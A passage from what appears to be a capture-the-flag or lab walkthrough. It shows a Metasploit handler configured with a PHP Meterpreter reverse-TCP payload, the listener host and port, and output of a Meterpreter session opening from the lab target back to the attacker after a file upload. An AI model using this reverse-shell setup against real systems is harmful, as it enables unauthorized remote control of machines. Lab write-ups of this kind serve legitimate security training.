...
<br>make sure the file has been uplaoded successfully
...
<br>msf exploit(handler) > set payload php/meterpreter/reverse_tcp
<br>payload => php/meterpreter/reverse_tcp
<br>msf exploit(handler) > set LHOST 10.10.*.*
<br>LHOST => 10.10.14.10
<br>msf exploit(handler) > set LPORT 4455
<br>LPORT => 4455
<br>msf exploit(handler) > exploit </p>

<p>[*] Started reverse TCP handler on 10.10.*.*:4455 
<br>[*] Starting the payload handler...
<br>[*] Sending stage (33986 bytes) to 10.10.10.7
<br>[*] Meterpreter session 1 opened (10.10.*.*:4455 -> 10.10.10.7:39251) at 2018-03-03 08:33:58 -0500</p>
